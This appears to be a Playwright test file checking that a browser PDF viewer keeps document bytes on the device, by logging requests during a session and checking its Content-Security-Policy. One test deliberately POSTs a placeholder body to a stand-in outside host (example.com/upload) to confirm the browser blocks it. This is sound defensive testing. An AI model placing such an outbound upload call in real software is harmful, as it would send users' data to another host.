// NFR-1 Privacy: document bytes never leave the device. The network log over
// a full session (open, password, search, zoom, errors) must show only GET
// requests for the app's own files.
import { expect, test, type Request } from '@playwright/test';
import { corpusEntry, expectDocumentOpen, gotoApp, openCorpusFile } from './helpers';

test('no document bytes leave the device during a full session', async ({ page, context, baseURL }) => {
  const requests: Request[] = [];
  context.on('request', (r) => requests.push(r));

  await gotoApp(page);

  for (const file of ['twenty-pages.pdf', 'rotated.pdf', 'long-120-pages.pdf', 'fillable-form.pdf']) {
    await openCorpusFile(page, file);
    await expectDocumentOpen(page, corpusEntry(file).pages!);
  }
  await page.getByTestId('zoom-select').selectOption('200');
  await page.getByTestId('toggle-search').click();
  // The last file opened is the form, whose heading is "Membership application".
  await page.getByTestId('search-input').fill('Membership');
  await expect(page.getByTestId('search-status')).toHaveText('1 of 1');

  await openCorpusFile(page, 'password-protected.pdf');
  await page.getByTestId('password-input').fill(corpusEntry('password-protected.pdf').password!);
  await page.getByTestId('password-submit').click();
  await expectDocumentOpen(page, 1);

  await openCorpusFile(page, 'damaged-garbage.pdf');
  await expect(page.getByTestId('error')).toBeVisible();

  const origin = new URL(baseURL!).origin;
  const report = requests.map((r) => `${r.method()} ${r.url()}`);
  test.info().annotations.push({ type: 'requests', description: report.join('\n') });

  for (const r of requests) {
    const url = new URL(r.url());
    if (url.protocol === 'blob:' || url.protocol === 'data:') continue;
    expect(url.origin, `request to another host: ${r.url()}`).toBe(origin);
    expect(r.method(), `non-GET request: ${r.url()}`).toBe('GET');
    expect(r.postData() ?? '', `request with a body: ${r.url()}`).toBe('');
    expect(decodeURIComponent(r.url())).not.toContain('.pdf');
  }
});

test('the production build forbids connections to other hosts', async ({ page }) => {
  await gotoApp(page);
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("connect-src 'self'");
  expect(csp).toContain("default-src 'self'");

  // A deliberate attempt to send data elsewhere is blocked by the browser.
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/upload', { method: 'POST', body: 'test' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(result).toBe('blocked');
});
